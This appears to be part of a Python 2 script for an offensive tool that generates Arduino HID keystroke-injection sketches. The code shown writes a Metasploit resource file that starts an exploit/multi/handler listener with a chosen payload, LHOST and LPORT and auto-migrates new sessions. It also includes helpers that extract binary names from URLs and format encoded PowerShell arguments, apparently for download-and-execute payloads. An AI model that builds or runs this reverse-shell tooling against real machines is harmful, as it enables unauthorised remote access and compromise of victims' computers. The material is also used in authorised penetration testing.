#!/usr/bin/python
#uses HID-Project.h from https://github.com/NicoHood/HID, can be installed from Arduino Library Manager

import sys
import argparse
import os
import subprocess
import socket

def bannerMain():

  clearScreen()
  banner = "****************************************************************************\n"
  banner += "* ____  _     _____ ____  _____  _     ____  _     ____  _____  _____ ____ *\n"
  banner += "*/  _ \/ \ |\/  __//  __\/__ __\/ \ /|/  __\/ \ /\/ ___\/__ __\/  __//  __\\*\n"
  banner += "*| / \|| | //|  \  |  \/|  / \  | |_|||  \/|| | |||    \  / \  |  \  |  \/|*\n"
  banner += "*| \_/|| \// |  /_ |    /  | |  | | |||    /| \_/|\___ |  | |  |  /_ |    /*\n"
  banner += "*\\____/\\__/  \\____\\\\_/\\_\\  \\_/  \\_/ \\|\\_/\\_\\\\____/\\____/  \\_/  \\____\\\\_/\\_\\*\n"
  banner += "*                                                                          *\n"
  banner += "****************************************************************************\n"
  banner += "\n"
  banner += "\"Hey, hey, hey - don't be mean. We don't have to be mean. 'Cause, remember: no matter where you go... there you are\""
  banner += "\n\n"
  print banner

def clear():

  os.system('clear')

def clearScreen():

  if sys.platform == "linux" or sys.platform == "linux2" or sys.platform == "darwin":
    clear()
  elif sys.platform == "win32":
    cls()

def cls():
  os.system('cls')
  
def msfRCfile(IP,port,payload, fileName):

  buffer = "use exploit/multi/handler\n"
  buffer += "set PAYLOAD " + payload + "\n"
  buffer += "set LHOST " + IP + "\n"
  buffer += "set LPORT " + port + "\n"
  buffer += "set ExitOnSession false\n"
  buffer += "set autorunscript migrate -f\n"
  buffer += "exploit -j -z\n"

  fileName = checkRC(fileName)
  file = open(fileName,'w')
  file.write(buffer)
  file.close()

  print "\n\nWrote Metasploit file " + fileName 

def checkIP(IPaddress):
  try:
    socket.inet_aton(IPaddress)
    return True
  except socket.error:
    return False

def FileCheck(fileName):
  if os.path.exists(fileName):
    overwrite = raw_input ("File " + fileName+ " already exists. Overwrite? Y/N: ")
    if overwrite not in ('Y','y','yes','Yes','YES'):
      return True
    else:
      return False
  else:
    return False
	
def checkINO(fileName):
  if not fileName.endswith('.ino'):
    fileName = fileName + ".ino"
  return fileName
  
def checkRC(fileName):
  if not fileName.endswith('.rc'):
    fileName = fileName + ".rc"
  return fileName
  
  
def getFileName(defaultFileName):

  fileExists = True
  while fileExists == True:
    fileName = raw_input("Please enter the name of the output file (if left blank the default \""+defaultFileName+"\"): ")
    if fileName == "":
      fileName = defaultFileName
    fileExists = FileCheck(fileName)
    fileName = checkINO(fileName)
  return fileName
  
def getRCFileName(defaultFileName):

  fileExists = True
  while fileExists == True:
    fileName = raw_input("Please enter the name of the Metasploit RC file (if left blank the default \""+defaultFileName+"\"): ")
    if fileName == "":
      fileName = defaultFileName
    fileExists = FileCheck(fileName)
    fileName = checkRC(fileName)
  return fileName

  
def getBinary(URL):
  binary = URL.split("/")[-1]
  return binary
  
def checkQuotes(string):

  if string.startswith('-enc') or string.startswith('-Enc'):
    string = string.replace('"','')
  elif string.startswith('"') and string.endswith('"'):
    string = string.replace('"','\\\"')
  else:
    string = '\\\"' + string + '\\\"'
  return string
  
def addEscape(string):
  string = string.replace('"','\\"')
  return string
